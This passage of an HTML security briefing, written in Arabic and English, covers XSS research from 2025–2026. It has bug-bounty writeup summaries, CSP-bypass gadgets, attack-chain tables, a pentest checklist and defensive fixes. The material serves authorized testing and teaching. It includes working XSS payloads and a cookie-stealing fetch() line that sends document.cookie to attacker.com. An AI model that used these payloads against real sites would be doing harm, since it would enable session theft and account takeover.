+      <div class="wu-step ar"><strong>خطوة 4:</strong> بيـ send packet بـ custom namespace <code>/alert()</code> — الـ server بيرجع response فيها <code>2/alert(),[...]</code> — ده valid JavaScript! المتصفح بيـ execute الـ alert function لأن الـ content type مش محمي.</div>
+      <div class="wu-step"><strong>Socket.IO CSP Gadget:</strong><br/><span style="color:var(--text3)">// Send to Socket.IO:</span><br/>io("/alert()", {transports: ["polling"]}).emit("test")<br/><span style="color:var(--text3)">// Server responds:</span><br/>2/alert(),["test"]<br/><span style="color:var(--text3)">// Browser loads as script → alert() executes!</span></div>
+      <p><strong>الدرس:</strong> CSP بيفحص الـ domain لكن مش الـ content نفسه إذا مفيش <code>X-Content-Type-Options: nosniff</code>. أي endpoint بيرجع user-controlled content كـ text بدون الـ header ده ممكن يستخدم كـ CSP gadget.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0725" target="_blank">Jorian Woltjer Writeup →</a>
+      <span class="tag t-pink">CSP Bypass</span>
+      <span class="tag t-red">mXSS</span>
+      <span class="tag t-gray">Socket.IO Gadget</span>
+    </div>
+  </div>
+
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🩷</div>
+      <div class="wu-info">
+        <div class="wu-title">JSONP CSP Bypass via Trusted Domains (Google, YouTube, GitHub)</div>
+        <div class="wu-sub">Intigriti Tips 2026 · تقنية موثقة ومستخدمة في real programs</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> موقع عنده CSP بيـ whitelist domain زي <code>*.googleapis.com</code> أو <code>*.github.io</code> أو <code>cdnjs.cloudflare.com</code>.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> فحص الـ CSP header من response — وجد domains موثوقة مدرجة.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> دور على JSONP endpoints في الـ domains دي — JSONP بيسمح بتحديد callback function name في الـ URL.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> مثلاً Google APIs: <code>https://accounts.google.com/o/oauth2/revoke?token=alert(1)</code> — بيرجع <code>alert(1)({"error":"..."})</code> وده valid JS.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> بما إن الـ domain في الـ CSP whitelist، الـ browser بيسمح لـ script tag تحمل منه.</div>
+      <div class="wu-step"><strong>CSP Bypass via Angular on cdnjs:</strong><br/><span style="color:var(--text3)">// CSP: script-src 'self' https://cdnjs.cloudflare.com</span><br/>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"&gt;&lt;/script&gt;<br/>&lt;div ng-app ng-csp&gt;{{$on.curry.call().alert(1)}}&lt;/div&gt;<br/><span style="color:var(--green)">// Angular على cdnjs هو "trusted" لكن بيسمح بـ code execution!</span></div>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://www.intigriti.com/blog/business-insights/31-bite-sized-tips-techniques-and-bug-bounty-resources-to-kick-off-2026" target="_blank">Intigriti 2026 Tips →</a>
+      <a class="wu-link" href="https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses" target="_blank">CSP Bypass Guide →</a>
+      <span class="tag t-pink">CSP Bypass</span>
+      <span class="tag t-gray">JSONP</span>
+      <span class="tag t-purple">Angular Gadget</span>
+    </div>
+  </div>
+</div>
+
+<!-- ATTACK CHAINS -->
+<div class="section" id="wu-chains">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--amber)"></span>
+    <span class="sec-title">Attack Chains الجديدة في 2025</span>
+    <span class="sec-en">XSS as Part of Larger Exploits</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">الـ XSS مش غاية — هو وسيلة</div>
+    <div class="card-body">
+      <p>الاتجاه الأقوى في 2025 إن الـ XSS بقى <strong>خطوة في سلسلة</strong> وليس الهجوم كله. الـ bounties الأعلى كانت لما الباحث بيثبت إن الـ XSS أدى لـ account takeover أو SSRF أو data exfiltration. الـ security team لما بتسمع "XSS" بيفكروا alert popup — لكن الـ impact الحقيقي أكبر بكتير.</p>
+    </div>
+  </div>
+
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟡</div>
+      <div class="wu-info">
+        <div class="wu-title">XSS → Account Takeover via Session Cookie Theft (بدون HttpOnly)</div>
+        <div class="wu-sub">سيناريو متكرر في 2025 — NahamSec, HackerOne reports</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> Stored XSS في admin dashboard وcookies من غير HttpOnly flag.</p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> وجد Stored XSS في حقل معين بيتعرض على الـ admin.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> فحص الـ cookies في الـ DevTools — لاحظ إن الـ session cookie مش عندها HttpOnly flag، يعني JavaScript قادر يقرأها.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> عمل XSS payload بيبعت الـ cookies لـ server خارجي:</div>
+      <div class="wu-step"><strong>Cookie Stealing Payload:</strong><br/>fetch('https://attacker.com/steal?c=' + btoa(document.cookie), {<br/>  method: 'GET', mode: 'no-cors'<br/>})</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> الـ server الخارجي استقبل الـ admin session cookie.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> استخدم الـ cookie في browser جديد — حصل account takeover كامل للـ admin account.</div>
+      <p><strong>الإصلاح:</strong> HttpOnly + Secure + SameSite=Strict على كل الـ session cookies.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://www.bugbountyhunter.com/vulnerability/?type=xss" target="_blank">BugBountyHunter.com XSS Guide →</a>
+      <span class="tag t-amber">Attack Chain</span>
+      <span class="tag t-red">Account Takeover</span>
+      <span class="tag t-gray">Cookie Theft</span>
+    </div>
+  </div>
+
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟡</div>
+      <div class="wu-info">
+        <div class="wu-title">Self-XSS → XSSJacking → Real XSS على Victims</div>
+        <div class="wu-sub">Judge.me Bug Bounty · تقنية XSSJacking لتحويل Self-XSS لـ Real XSS</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> تطبيق فيه "Self-XSS" — يعني XSS بيشتغل بس على حساب المهاجم نفسه، مش على حساب الضحية. عادة البرامج ما بتقبلش تقارير Self-XSS لأن التأثير محدود.</p>
+      <p><strong>كيف الباحث حوّله لـ Real XSS:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> وجد Self-XSS في حقل review email — الـ payload بيشتغل بس لما المهاجم نفسه يفتح الصفحة.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> لاحظ إن الصفحة ممكن تتحط في iframe (مفيش X-Frame-Options protection).</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> بنى attack page بتستخدم XSSJacking — بتحط الـ vulnerable page في iframe غير مرئي وبتخلي الضحية تعمل actions معينة (زي paste) بدون ما يعرف.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> الضحية لما يزور الـ attack page، بتستخدم social engineering تخليه يعمل Ctrl+V في نافذة مخفية — الـ clipboard بيحتوي على الـ XSS payload اللي المهاجم جهّزه.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> الـ XSS بيتنفذ في context الضحية وليس المهاجم — بقى Real XSS.</div>
+      <p><strong>الإصلاح:</strong> X-Frame-Options: DENY + CSP: frame-ancestors 'none' + تصليح الـ Self-XSS نفسه.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md" target="_blank">HackerOne Top XSS →</a>
+      <span class="tag t-amber">XSSJacking</span>
+      <span class="tag t-gray">Self-XSS Escalation</span>
+      <span class="tag t-red">Clickjacking</span>
+    </div>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <tr>
+        <th>Attack Chain</th>
+        <th>الوصف المختصر</th>
+        <th>مثال حقيقي 2025</th>
+        <th>الإصلاح الأساسي</th>
+      </tr>
+      <tr>
+        <td class="ltr">XSS → Account Takeover</td>
+        <td>سرقة session cookie أو تغيير email/password</td>
+        <td>Stored XSS in TikTok Ads — $2,500</td>
+        <td>HttpOnly + SameSite=Strict</td>
+      </tr>
+      <tr>
+        <td class="ltr">XSS → SSRF</td>
+        <td>XSS يعمل requests لـ internal IPs</td>
+        <td>CVE-2025-4123 Grafana</td>
+        <td>Network segmentation + CSP</td>
+      </tr>
+      <tr>
+        <td class="ltr">XSS → CSRF</td>
+        <td>XSS يـ auto-submit forms نيابة عن الضحية</td>
+        <td>InnoGames: CSRF + XSS chain — $1,100</td>
+        <td>CSRF tokens + SameSite</td>
+      </tr>
+      <tr>
+        <td class="ltr">Self-XSS → XSSJacking</td>
+        <td>تحويل XSS محدود لـ XSS على أي ضحية</td>
+        <td>Judge.me review email bug</td>
+        <td>X-Frame-Options + frame-ancestors</td>
+      </tr>
+      <tr>
+        <td class="ltr">Open Redirect → XSS</td>
+        <td>Redirect لصفحة فيها XSS أو javascript: URL</td>
+        <td>CVE-2025-4123 Grafana chain</td>
+        <td>Validate redirect URLs whitelist</td>
+      </tr>
+      <tr>
+        <td class="ltr">Prototype Pollution → XSS</td>
+        <td>تلويث الـ prototype يفتح script gadgets</td>
+        <td>Elastic/SwiftType — 154 upvotes</td>
+        <td>Object.freeze + library updates</td>
+      </tr>
+    </table>
+  </div>
+</div>
+
+<!-- TESTING MAP -->
+<div class="section" id="testing-map">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--cyan)"></span>
+    <span class="sec-title">خريطة الاختبار — أين وكيف تفحص؟</span>
+    <span class="sec-en">Pentesting Checklist for the Team</span>
+    <span class="sec-badge">للاستخدام المباشر في الـ pentest</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title" style="color:var(--cyan)">الخريطة الكاملة — كل نوع XSS وأين تفحصه وكيف</div>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <tr>
+        <th>السيناريو / النوع</th>
+        <th>أين تفحص في الموقع؟</th>
+        <th>أدوات وطريقة الفحص</th>
+        <th>الـ Payload / Test</th>
+        <th>علامة النجاح</th>
+      </tr>
+      <tr>
+        <td style="color:var(--red);font-weight:600">Reflected XSS</td>
+        <td>URL parameters (?q=, ?search=, ?name=, ?id=), حقول البحث, error messages</td>
+        <td>Burp Suite Scanner + Manual testing</td>
+        <td class="ltr">&lt;u&gt;testXYZ&lt;/u&gt; أولاً ثم &lt;svg onload=alert(1)&gt;</td>
+        <td>الـ tag بيظهر في الـ page source من غير escaping</td>
+      </tr>
+      <tr>
+        <td style="color:var(--red);font-weight:600">Stored XSS</td>
+        <td>حقول الاسم، التعليقات، الـ bio، أي input بيتخزن ويتعرض لتاني</td>
+        <td>Manual testing مع unique marker</td>
+        <td class="ltr">&lt;b&gt;MARK123&lt;/b&gt; ثم فتح الصفحة من account تاني</td>
+        <td>الـ bold ظهر على الـ account التاني</td>
+      </tr>
+      <tr>
+        <td style="color:var(--purple);font-weight:600">DOM XSS</td>
+        <td>URL hash (#), location.search, document.referrer, postMessage listeners</td>
+        <td>Burp Suite DOM Invader, DOMlogger++</td>
+        <td class="ltr">#&gt;&lt;svg onload=alert(1)&gt; في الـ URL hash</td>
+        <td>الـ alert ينفذ من غير server request</td>
+      </tr>
+      <tr>
+        <td style="color:var(--teal);font-weight:600">Blind XSS</td>
+        <td>كل حقل ممكن يتعرض على admin أو support (راجع الجدول فوق)</td>
+        <td>XSS Hunter Pro, Burp Collaborator, custom server</td>
+        <td class="ltr">&gt;&lt;script src="https://your.xsshunter.com/x.js"&gt;&lt;/script&gt;</td>
+        <td>Callback للـ server الخارجي لما admin يفتح الصفحة</td>
+      </tr>
+      <tr>
+        <td style="color:var(--blue);font-weight:600">postMessage XSS</td>
+        <td>أي صفحة فيها iframes أو third-party widgets</td>
+        <td>DevTools Console search, Burp Suite</td>
+        <td class="ltr">getEventListeners(window).message</td>
+        <td>Listener موجود بدون origin check</td>
+      </tr>
+      <tr>
+        <td style="color:var(--purple);font-weight:600">Prototype Pollution</td>
+        <td>URL parameters, JSON inputs, أي deep merge في الكود</td>
+        <td>ppfuzz 2.0, Manual URL testing</td>
+        <td class="ltr">?__proto__[test]=xyz ثم Object.prototype.test في الـ console</td>
+        <td>القيمة "xyz" ترجع في الـ console</td>
+      </tr>
+      <tr>
+        <td style="color:var(--orange);font-weight:600">Rich Text Editor XSS</td>
+        <td>كل WYSIWYG editor في الموقع</td>
+        <td>Manual testing: direct, paste, source view</td>
+        <td class="ltr">Paste crafted HTML, direct SVG, source edit</td>
+        <td>الـ XSS ينفذ في الـ preview أو الـ saved content</td>
+      </tr>
+      <tr>
+        <td style="color:var(--red);font-weight:600">mXSS (DOMPurify)</td>
+        <td>أي حقل فيه DOMPurify أو sanitizer مشابه</td>
+        <td>فحص version بتاعة الـ DOMPurify في package.json</td>
+        <td class="ltr">DOMPurify version check: بحث عن "purify.js" version في source</td>
+        <td>Version أقل من 3.3.2 = vulnerable</td>
+      </tr>
+      <tr>
+        <td style="color:var(--pink);font-weight:600">CSP Bypass</td>
+        <td>فحص الـ CSP header في كل page</td>
+        <td>CSP Evaluator by Google, manual analysis</td>
+        <td class="ltr">فحص إذا كان cdnjs أو googleapis أو github.io في الـ whitelist</td>
+        <td>JSONP endpoint قابل للاستغلال في الـ trusted domain</td>
+      </tr>
+      <tr>
+        <td style="color:var(--amber);font-weight:600">XSSJacking</td>
+        <td>أي صفحة فيها Self-XSS</td>
+        <td>فحص X-Frame-Options header</td>
+        <td class="ltr">curl -I URL | grep -i "x-frame-options"</td>
+        <td>Header غايب = ممكن يتحط في iframe</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">الأدوات المستخدمة في 2025 للـ XSS Testing</div>
+    <div class="card-body">
+      <div class="tbl">
+        <table>
+          <tr><th>الأداة</th><th>الاستخدام</th><th>Link</th></tr>
+          <tr><td>Burp Suite — DOM Invader</td><td>Automatic DOM XSS tracing من sources لـ sinks</td><td class="ltr">Built-in في Burp Suite Pro</td></tr>
+          <tr><td>DOMlogger++</td><td>Browser extension لتتبع كل DOM sinks في real-time</td><td class="ltr">github.com/kevin_mizu/domloggerpp</td></tr>
+          <tr><td>ppfuzz 2.0</td><td>Prototype Pollution fuzzing تلقائي مع ES modules support</td><td class="ltr">2025 update — headless Chromium</td></tr>
+          <tr><td>XSS Hunter Pro</td><td>Blind XSS infrastructure — بيبعت screenshot + cookies</td><td class="ltr">xsshunter.trufflesecurity.com</td></tr>
+          <tr><td>CSP Evaluator</td><td>تحليل الـ CSP header وإيجاد الثغرات فيه</td><td class="ltr">csp-evaluator.withgoogle.com</td></tr>
+          <tr><td>JS-DOMestify</td><td>تحويل JS لـ ASCII-only لتجاوز WAF filters</td><td class="ltr">Intigriti Nov 2025 Bug Bytes</td></tr>
+          <tr><td>FFUF</td><td>Parameter fuzzing سريع</td><td class="ltr">github.com/ffuf/ffuf</td></tr>
+          <tr><td>Nuclei XSS templates</td><td>Automated scanning لـ known XSS patterns</td><td class="ltr">github.com/projectdiscovery/nuclei-templates</td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="src">المصدر: <a href="https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-227-august-2025" target="_blank">Intigriti Bug Bytes Aug 2025</a> | <a href="https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-230-november-2025" target="_blank">Intigriti Bug Bytes Nov 2025</a></div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="section" id="fixes">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--green)"></span>
+    <span class="sec-title">الحلول الكاملة — Checklist للـ Dev Team</span>
+    <span class="sec-en">Defense Strategies — Pre-Production Security</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title" style="color:var(--green)">✅ Checklist الكامل قبل الرفع للـ Production</div>
+    <div class="card-body">
+      <div class="checklist">
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">1</div><div><strong>Output Encoding حسب الـ Context:</strong> مش encoding واحد يكفي — HTML context: HTML entities، JS context: \uXXXX، URL context: percent encoding، CSS context: \XX. كل context محتاج encoding مختلف.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">2</div><div><strong>DOMPurify >= 3.3.2:</strong> أي version أقل من ده vulnerable لـ mXSS. فحص كل package.json وnpm audit — ده أهم حاجة لو بتستخدم rich text.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">3</div><div><strong>Content Security Policy صارم:</strong> <code>script-src 'self' 'nonce-RANDOM_PER_REQUEST'</code> + فحص كل trusted domain للـ JSONP endpoints + X-Content-Type-Options: nosniff على كل response.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">4</div><div><strong>HttpOnly + SameSite=Strict على كل الـ Session Cookies:</strong> حتى لو الـ XSS نجح، الـ cookies مش متاحة لـ JavaScript ومش هتتبعت لـ external domain.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">5</div><div><strong>postMessage Origin Validation — Strict Equality:</strong><br/><code>if (event.origin !== 'https://exact-domain.com') return;</code><br/>مش <code>indexOf</code> ولا <code>includes</code> ولا <code>startsWith</code>.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">6</div><div><strong>Object.freeze(Object.prototype):</strong> أول سطر في أول script في كل صفحة — بيمنع Prototype Pollution. أو استخدام <code>structuredClone()</code> بدل الـ deep merge.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">7</div><div><strong>X-Frame-Options: DENY + CSP frame-ancestors 'none':</strong> بيمنع XSSJacking وClickjacking على صفحات حساسة.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">8</div><div><strong>Trusted Types API:</strong> Browser API بتمنع الـ DOM sinks (innerHTML, document.write) من قبول raw strings — بتفرض المرور عبر Trusted Types policy.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">9</div><div><strong>Subresource Integrity (SRI) على كل 3rd-party scripts:</strong><br/><code>&lt;script src="https://cdn.../x.js" integrity="sha384-HASH" crossorigin="anonymous"&gt;&lt;/script&gt;</code></div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">10</div><div><strong>فحص الـ 3rd-party libraries بـ npm audit / Snyk:</strong> Mermaid, Chart.js, rich text editors, jQuery plugins — كلها ممكن تكون vulnerable. اعمل audit قبل كل deploy.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">11</div><div><strong>LLM Output Sanitization:</strong> لو الموقع فيه AI features — عامل الـ AI output عمل user input وطبق نفس الـ sanitization قبل عرضه في الـ DOM.</div></div>
+        <div class="chk-item"><div class="chk-num" style="background:rgba(34,197,94,.15);color:var(--green)">12</div><div><strong>Paste Events Sanitization في الـ Rich Text Editors:</strong> الـ paste event ممكن يحقن HTML من الـ clipboard — لازم يتـ sanitize بنفس طريقة الـ direct input.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">CSP Header المثالي</div>
+    <div class="card-body">
+      <div class="code">Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
+  style-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
+  img-src 'self' data: https:;
+  connect-src 'self' https://your-api.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+  object-src 'none';
+  require-trusted-types-for 'script';</div>
+      <div class="alert alert-red" style="margin-top:.8rem">
+        <strong>⚠️ تحذير:</strong> لو محتاج تـ whitelist أي CDN (cdnjs, googleapis, github.io) — افحص كل الـ JSONP endpoints في الـ domain ده. Angular على cdnjs ممكن يـ bypass الـ CSP بالكامل. الحل الأفضل: استخدم Subresource Integrity بدل الـ domain whitelist.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div style="text-align:center;padding:2rem 0;border-top:1px solid var(--border);color:var(--text3);font-size:12px;font-family:'JetBrains Mono',monospace;margin-top:2rem">
+  XSS :: 2025-2026 Security Research v2 — For Authorized Penetration Testing Only<br/>
+  Sources: HackerOne · Intigriti · Bugcrowd · PortSwigger Research · Medium Write-ups · CVE Database<br/>
+  آخر تحديث: أبريل 2026 | للاستخدام الأخلاقي فقط في بيئات الاختبار المأذون بها
+</div>
+
+</div>
+</body>
+</html>
